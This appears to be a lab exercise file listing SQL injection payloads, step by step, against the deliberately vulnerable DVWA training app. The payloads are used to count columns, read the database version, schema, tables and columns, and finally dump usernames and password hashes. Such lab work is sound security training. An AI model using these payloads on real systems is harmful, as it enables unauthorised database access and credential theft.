-- Challenge 1: SQL Injection Commands
-- Target: DVWA at 10.5.5.12
-- Objective: Retrieve Bob Smith's credentials (username: smithy, password hash)

-- 1. Check for SQL Injection Vulnerability
' OR 1=1 #

-- 2. Determine Number of Fields
1' ORDER BY 1 #
1' ORDER BY 2 #
1' ORDER BY 3 # -- Returns error, indicating 2 columns

-- 3. Check DBMS Version
1' OR 1=1 UNION SELECT 1, VERSION() # -- Returns MySQL 5.5.58

-- 4. Get Database Name
1' OR 1=1 UNION SELECT 1, DATABASE() # -- Returns dvwa

-- 5. Retrieve Table Names
1' OR 1=1 UNION SELECT 1, TABLE_NAME FROM information_schema.tables WHERE table_schema='dvwa' # -- Returns guestbook, users

-- 6. Retrieve Column Names from users Table
1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' # -- Returns user_id, first_name, last_name, user, password, avatar, last_login, failed_login

-- 7. Retrieve User Credentials
1' OR 1=1 UNION SELECT user, password FROM users # -- Returns smithy and password hash
